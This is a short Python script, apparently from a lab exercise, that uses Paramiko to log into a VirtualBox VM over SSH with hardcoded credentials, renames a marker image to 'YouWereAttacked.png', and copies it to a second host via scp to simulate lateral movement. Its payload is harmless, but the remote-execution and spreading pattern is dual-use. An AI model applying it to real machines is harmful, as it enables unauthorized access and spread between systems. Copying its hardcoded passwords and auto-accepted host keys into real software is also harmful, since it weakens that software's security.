import paramiko

def connect_to_target(target_ip, source_ip):
    """
    Connects to a remote machine via SSH using Paramiko, renames a file on the
    remote system, and attempts to copy it back to another system.
    This function simulates a step of a reverse-shell or lateral movement attack.

    Parameters:
        target_ip (str): IP address of the target machine to connect to.
        source_ip (str): IP of the machine receiving the copied file.
    """
    # SSH connection configuration
    port = 2222                  
    username = "vboxuser" #geändert zu vm user
    password = "Attacke" #geändert zu vmuser


    # Command to rename a file on the target system (simulating malware behavior)
    rename= "mv ~/daisy/src/daisy/communication/ThatCouldBeMaleware.png ~/daisy/src/daisy/communication/YouWereAttacked.png"
    # Attempt to copy the file to another machine using SCP
    copy = "scp -P 2222 ~/daisy/src/daisy/communication/YouWereAttacked.png vboxunser@"+source_ip+":~/daisy/src/daisy/communication/YouWereAttacked.png"

    # Initialize SSH client
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
    # Accepts unknown SSH host keys automatically (insecure but useful for controlled lab setups)

    try:
        # Establish SSH connection to the target VM
        client.connect(target_ip, port=port, username=username, password=password)

        # Execute commands on the remote machine
        stdin, stdout, stderr = client.exec_command(rename)
        stdin, stdout, stderr = client.exec_command(copy)

        # Print command output for debugging/logging
        print("stdout:",stdout.read().decode())
        print("stderr:",stderr.read().decode())

    except Exception as e:
        # Any network, authentication, or command error
        print(e)
    finally:
        # Always close the SSH session
        client.close()
        print("Connection closed.")

